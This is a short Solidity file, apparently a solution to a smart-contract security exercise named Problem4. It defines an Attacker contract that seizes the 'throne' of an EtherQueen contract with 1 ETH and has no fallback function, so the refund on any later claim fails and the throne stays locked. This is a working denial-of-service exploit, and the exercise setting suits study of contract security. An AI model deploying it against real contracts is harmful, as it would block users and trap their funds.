// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {EtherQueen} from "../src/Problem4.sol";

contract Attacker {

    EtherQueen queen; // The smart contract to exploit.

    // Initialize the smart contract to exploit.
    constructor(EtherQueen _eq) {
        queen = _eq;
    }

    // Claim the throne with 1 ETH.
    function attack() public payable {
        queen.claimThrone{value: 1 ether}();
    }

    // By not implementing a fallback, this contract
    // cannot receive any money. Thus, nobody can claim
    // the throne since claimThrone() will throw an
    // error when trying to send back my balance.

}